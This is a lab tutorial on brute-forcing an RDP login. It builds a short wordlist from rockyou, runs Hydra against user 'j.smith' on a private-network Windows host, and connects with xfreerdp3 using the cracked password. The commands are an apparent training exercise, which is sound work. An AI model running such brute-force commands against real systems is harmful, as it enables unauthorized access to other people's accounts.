## Introduction
  
Let's begin by accessing our Kali Linux attacker machine. We will utilize Hydra, one of the most popular tools for conducting brute force attacks. Hydra comes pre-installed with Kali Linux, so thereâ€™s no need for manual installation.  
  
In this demonstration, we will target a specific user with the username **j.smith** (which corresponds to our Client 1's Windows machine). In real-world scenarios, an attacker would typically perform user enumeration to identify valid usernames before executing a brute force or credential stuffing attack, especially if multiple user accounts are involved.  
  
We will also create a custom wordlist based on the well-known `rockyou` wordlist, which is included with Kali Linux.  
  
## Creating a Custom Wordlist
  
- Navigate to the Wordlists Directory

```
cd /usr/share/wordlists/   
```

- Extract the Rockyou File

```
sudo gunzip rockyou.txt.gz
```

- Copy the Rockyou Text File to Your Desktop or Another Preferred Directory

```
cp rockyou.txt /home/kali/Desktop/
```

- Fetch the First 20 Passwords and Redirect Them into a New `passwords.txt` File

```
head -n 20 rockyou.txt > passwords.txt
```

- Append the User j.smith's Password to the List (Now I know we are kind of cheating here, but this is just a Proof of Concept so.....)
  
```
echo "1234" >> passwords.txt
```

- Verify the Custom Passwords Wordlist

```
cat passwords.txt
```

- You should see 20 random passwords listed, with the last entry being the actual password for the user.  

## Performing the Attack
  
- With the target user and custom wordlist prepared, we can move on to executing the brute force attack. The command below performs a password brute force attack on user j.smith, targeting the Windows client machine.  
  
```
hydra -l "j.smith" -P /home/kali/Desktop/passwords.txt rdp://192.168.125.30 -t 1 -V
```

**Command Breakdown:**
	
	- **`-l "j.smith"`**: Specifies the username for the brute force attempt.  
	- **`-P /home/kali/Desktop/passwords.txt`**: Provides Hydra with the custom password wordlist.  
	- **`rdp://192.168.125.30`**: Indicates the type of service being attacked (RDP) and the target IP address.  
	- **`-t 1`**: Sets the number of concurrent tasks to run (keeping it at 1 to avoid network overload).  
	- **`-V`**: Enables verbose output during the operation.

- After the attack has completed, you should see results indicating 20 failed attempts and 1 successful attempt on the password for the user.

- And we can check this using a tool called xfreerdp3 to RDP into the target machine. Run the tool by running following command:

```
xfreerdp3 /v:192.168.125.30 /port:3389 /u:"j.smith" /p:"1234" /cert:ignore -clipboard

# if tool is not installed on your system, install it using:
sudo apt install freerdp3-x11
```

- now you are connected to the target machine using RDP.
